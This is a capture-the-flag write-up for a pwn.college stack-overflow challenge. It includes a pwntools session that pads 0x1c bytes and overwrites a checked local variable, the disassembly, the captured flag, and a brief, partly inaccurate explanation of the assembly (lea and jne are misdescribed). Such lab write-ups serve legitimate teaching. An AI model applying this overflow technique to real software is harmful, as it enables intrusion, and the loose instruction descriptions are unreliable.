# Varaiable control hard
 in this challenge we need to build upon the the easy challenge the difference being we dont know the starting offset
 
## flag
pwn.college{46TRKg5Q7Fb29ARngTbf6td9DA_.dhTNzMDL5gDN1czW}

## Solve
```bash
In [1]: from pwn import *

In [2]: exe='./binary-exploitation-var-control'

In [3]: p=process(exe)
[x] Starting local process './binary-exploitation-var-control'
[+] Starting local process './binary-exploitation-var-control': pid 237

In [4]: offset=0x1c

In [5]: target=0x1cae49da

In [6]: payload=b'A'*offset+p32(target,endian='little')

In [7]: p.send(payload)

In [8]: p.readall()
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './binary-exploitation-var-control' stopped with exit code 0 (pid 237)
[x] Receiving all data: 135B
[+] Receiving all data: Done (135B)
Out[8]: b'Send your payload (up to 4096 bytes)!\nYou win! Here is your flag:\npwn.college{46TRKg5Q7Fb29ARngTbf6td9DA_.dhTNzMDL5gDN1czW}\n\n\nGoodbye!\n'

```

```bash
000000000401f4a <challenge>:
  401f4a:	f3 0f 1e fa          	endbr64
  401f4e:	55                   	push   rbp
  401f4f:	48 89 e5             	mov    rbp,rsp
  401f52:	48 83 ec 60          	sub    rsp,0x60
  401f56:	89 7d bc             	mov    DWORD PTR [rbp-0x44],edi
  401f59:	48 89 75 b0          	mov    QWORD PTR [rbp-0x50],rsi
  401f5d:	48 89 55 a8          	mov    QWORD PTR [rbp-0x58],rdx
  401f61:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
  401f68:	00 00 
  401f6a:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  401f6e:	31 c0                	xor    eax,eax
  401f70:	48 c7 45 d0 00 00 00 	mov    QWORD PTR [rbp-0x30],0x0
  401f77:	00 
  401f78:	48 c7 45 d8 00 00 00 	mov    QWORD PTR [rbp-0x28],0x0
  401f7f:	00 
  401f80:	48 c7 45 e0 00 00 00 	mov    QWORD PTR [rbp-0x20],0x0
  401f87:	00 
  401f88:	48 c7 45 e8 00 00 00 	mov    QWORD PTR [rbp-0x18],0x0
  401f8f:	00 
  401f90:	c7 45 f0 00 00 00 00 	mov    DWORD PTR [rbp-0x10],0x0
  401f97:	48 c7 45 c8 00 00 00 	mov    QWORD PTR [rbp-0x38],0x0
  401f9e:	00 
  401f9f:	48 c7 45 c8 00 10 00 	mov    QWORD PTR [rbp-0x38],0x1000
  401fa6:	00 
  401fa7:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401fab:	48 89 c6             	mov    rsi,rax
  401fae:	48 8d 3d 5b 11 00 00 	lea    rdi,[rip+0x115b]        # 403110 <_IO_stdin_used+0x110>
  401fb5:	b8 00 00 00 00       	mov    eax,0x0
  401fba:	e8 61 f1 ff ff       	call   401120 <printf@plt>
  401fbf:	48 8b 55 c8          	mov    rdx,QWORD PTR [rbp-0x38]
  401fc3:	48 8d 45 d0          	lea    rax,[rbp-0x30]
  401fc7:	48 89 c6             	mov    rsi,rax
  401fca:	bf 00 00 00 00       	mov    edi,0x0
  401fcf:	e8 6c f1 ff ff       	call   401140 <read@plt>
  401fd4:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  401fd7:	83 7d c4 00          	cmp    DWORD PTR [rbp-0x3c],0x0
  401fdb:	79 2c                	jns    402009 <challenge+0xbf>
  401fdd:	e8 fe f0 ff ff       	call   4010e0 <__errno_location@plt>
  401fe2:	8b 00                	mov    eax,DWORD PTR [rax]
  401fe4:	89 c7                	mov    edi,eax
  401fe6:	e8 95 f1 ff ff       	call   401180 <strerror@plt>
  401feb:	48 89 c6             	mov    rsi,rax
  401fee:	48 8d 3d 43 11 00 00 	lea    rdi,[rip+0x1143]        # 403138 <_IO_stdin_used+0x138>
  401ff5:	b8 00 00 00 00       	mov    eax,0x0
  401ffa:	e8 21 f1 ff ff       	call   401120 <printf@plt>
  401fff:	bf 01 00 00 00       	mov    edi,0x1
  402004:	e8 67 f1 ff ff       	call   401170 <exit@plt>
  402009:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  40200c:	85 c0                	test   eax,eax
  40200e:	74 16                	je     402026 <challenge+0xdc>
  402010:	48 8d 3d 49 11 00 00 	lea    rdi,[rip+0x1149]        # 403160 <_IO_stdin_used+0x160>
  402017:	e8 d4 f0 ff ff       	call   4010f0 <puts@plt>
  40201c:	bf 01 00 00 00       	mov    edi,0x1
  402021:	e8 4a f1 ff ff       	call   401170 <exit@plt>
  402026:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  402029:	3d da 49 ae 1c       	cmp    eax,0x1cae49da
  40202e:	75 0a                	jne    40203a <challenge+0xf0>
  402030:	b8 00 00 00 00       	mov    eax,0x0
  402035:	e8 09 fe ff ff       	call   401e43 <win>
  40203a:	48 8d 3d 3f 11 00 00 	lea    rdi,[rip+0x113f]        # 403180 <_IO_stdin_used+0x180>
  402041:	e8 aa f0 ff ff       	call   4010f0 <puts@plt>
  402046:	b8 00 00 00 00       	mov    eax,0x0
  40204b:	48 8b 4d f8          	mov    rcx,QWORD PTR [rbp-0x8]
  40204f:	64 48 33 0c 25 28 00 	xor    rcx,QWORD PTR fs:0x28
  402056:	00 00 
  402058:	74 05                	je     40205f <challenge+0x115>
  40205a:	e8 b1 f0 ff ff       	call   401110 <__stack_chk_fail@plt>
  40205f:	c9                   	leave
  402060:	c3                   	ret

```
lea is load into the memory, mov is move bytes and the cmp is for setting the flag and the jne is the loop to compare 
so first i read the code and found the offset at the cmp and substracted 0x30 -0x14 to get 0x1c and got the value to send that the hex offset that we need to send to get the flag.

  
